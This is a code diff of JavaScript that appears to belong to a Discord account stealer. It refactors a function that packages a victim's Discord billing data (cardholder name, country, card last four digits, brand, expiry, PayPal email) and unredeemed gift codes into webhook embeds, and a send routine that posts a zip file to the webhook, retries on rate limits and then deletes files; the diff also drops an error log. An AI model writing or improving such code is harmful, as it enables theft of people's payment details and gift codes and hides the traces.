@@ -84,28 +84,32 @@ const json = async (zipFile) => {
       });
     }
   }
-  discordAccountInfo.billing?.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
-    title: `Discord Account - Billing - ${billingType(billing.type)}`,
-    fields: (billing.type === 1 ? [
-      ['👨 Name', billing.billing_address.name],
-      ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
-      ['🔚 Ends in', code(billing.last_4)],
-      ['®️ Brand', billing.brand],
-      ['⛔ Expires in', code(billing.expires_month + '/' + billing.expires_year)]
-    ] : [
-      ['👨 Name', billing.billing_address.name],
-      ['✉️ Email', code(billing.email)],
-      ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
-    ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
-  }); }) : embeds.push({
-    title: 'Discord Billing', description: 'No Billing'
-  });
-  embeds.push({
-    title: 'Discord Promotions',
-    description: discordAccountInfo.gifts?.length > 1 ?discordAccountInfo.gifts.map(gift => {
-      return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
-    }).join('\n') : 'No Promotions'
-  });
+
+  if (discordAccountInfo.billing?.length >= 1) {
+    discordAccountInfo.billing.forEach(billing => embeds.push({
+      title: `Discord Account - Billing - ${billingType(billing.type)}`,
+      fields: (billing.type === 1 ? [
+        ['👨 Name', billing.billing_address.name],
+        ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
+        ['🔚 Ends in', code(billing.last_4)],
+        ['®️ Brand', billing.brand],
+        ['⛔ Expires in', code(billing.expires_month + '/' + billing.expires_year)]
+      ] : [
+        ['👨 Name', billing.billing_address.name],
+        ['✉️ Email', code(billing.email)],
+        ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
+      ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
+    }));
+  }
+
+  if (discordAccountInfo.gifts?.length >= 1) {
+    embeds.push({
+      title: 'Discord Promotions',
+      description: discordAccountInfo.gifts.map(gift => {
+        return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
+      }).join('\n')
+    });
+  }
 
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
@@ -137,7 +141,6 @@ const send = async (zipFile) => {
     });
     await deleteFiles();
   } catch (err) {
-    console.log(err.response?.data);
     await sleep((err.response?.data?.retry_after * 1000) + 500);
     await send(zipFile);
   }
